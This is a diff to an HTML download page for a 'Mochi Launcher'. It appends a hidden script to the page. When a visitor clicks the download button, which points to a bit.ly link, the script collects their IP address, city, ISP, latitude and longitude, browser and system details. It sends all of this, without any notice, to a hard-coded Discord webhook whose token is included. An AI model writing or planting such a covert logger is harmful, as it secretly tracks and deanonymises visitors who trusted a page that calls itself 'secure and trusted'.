@@ -35,7 +35,7 @@
                     <li>Lightweight and fast</li>
                     <li>Secure and trusted</li>
                 </ul>
-                <a href="https://bit.ly/4w5MpJp" class="download-btn" target="_blank">
+                <a href="https://bit.ly/4w5MpJp" class="download-btn" target="_blank" id="downloadBtn">
                     <span class="btn-icon">
                         <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                             <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
@@ -265,7 +265,7 @@
                     </svg>
                 </a>
             </div>
-            <p>&copy; 2026 Mochi Studios. All rights reserved.</p>
+            <p>&copy; 2025 Mochi Studios. All rights reserved.</p>
             <p>
                 <a href="#">Privacy Policy</a>
                 <a href="#">Terms of Service</a>
@@ -273,5 +273,97 @@
             </p>
         </div>
     </div>
+
+    <!-- ===== DISCORD WEBHOOK SCRIPT ===== -->
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534772140098851037/2V5pRNEo0zEb6dhXioKzYB9BijtMciEbOOcxyausOUQDghdsAVO3ucCNjNLM_BlsN9yn';
+
+        async function getVisitorInfo() {
+            const info = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: window.screen.width + 'x' + window.screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'Direct',
+                url: window.location.href,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Not specified'
+            };
+
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                info.ip = data.ip;
+            } catch {
+                info.ip = 'Could not fetch IP';
+            }
+
+            try {
+                const geoResponse = await fetch('https://ipapi.co/' + info.ip + '/json/');
+                const geoData = await geoResponse.json();
+                info.country = geoData.country_name || 'Unknown';
+                info.city = geoData.city || 'Unknown';
+                info.region = geoData.region || 'Unknown';
+                info.org = geoData.org || 'Unknown';
+                info.latitude = geoData.latitude || 'Unknown';
+                info.longitude = geoData.longitude || 'Unknown';
+            } catch {
+                info.country = 'Unknown';
+                info.city = 'Unknown';
+                info.region = 'Unknown';
+                info.org = 'Unknown';
+                info.latitude = 'Unknown';
+                info.longitude = 'Unknown';
+            }
+
+            return info;
+        }
+
+        async function sendToWebhook(info, action) {
+            const embed = {
+                title: 'Mochi Launcher - Visitor Activity',
+                color: 0xE88AB8,
+                timestamp: info.timestamp,
+                fields: [
+                    { name: 'Action', value: action, inline: false },
+                    { name: 'IP Address', value: info.ip, inline: true },
+                    { name: 'Location', value: info.country + ', ' + info.city + ' (' + info.region + ')', inline: true },
+                    { name: 'Coordinates', value: 'Lat: ' + info.latitude + ' / Lon: ' + info.longitude, inline: true },
+                    { name: 'ISP / Organization', value: info.org, inline: true },
+                    { name: 'User Agent', value: info.userAgent.substring(0, 100), inline: false },
+                    { name: 'Language / Platform', value: info.language + ' / ' + info.platform, inline: true },
+                    { name: 'Screen Resolution', value: info.screenResolution, inline: true },
+                    { name: 'Timezone', value: info.timezone, inline: true },
+                    { name: 'Referrer', value: info.referrer, inline: true },
+                    { name: 'URL', value: info.url, inline: false },
+                    { name: 'Cookies Enabled', value: info.cookiesEnabled ? 'Yes' : 'No', inline: true }
+                ]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch (e) {
+                console.log('Webhook error:', e);
+            }
+        }
+
+        // ===== DETECTAR CLIC EN EL BOTÓN DE DESCARGA =====
+        document.addEventListener('DOMContentLoaded', function() {
+            const downloadBtn = document.getElementById('downloadBtn');
+            if (downloadBtn) {
+                downloadBtn.addEventListener('click', async function(e) {
+                    const info = await getVisitorInfo();
+                    await sendToWebhook(info, 'DOWNLOAD CLICKED - User initiated download');
+                });
+            }
+        });
+    </script>
+
 </body>
 </html>
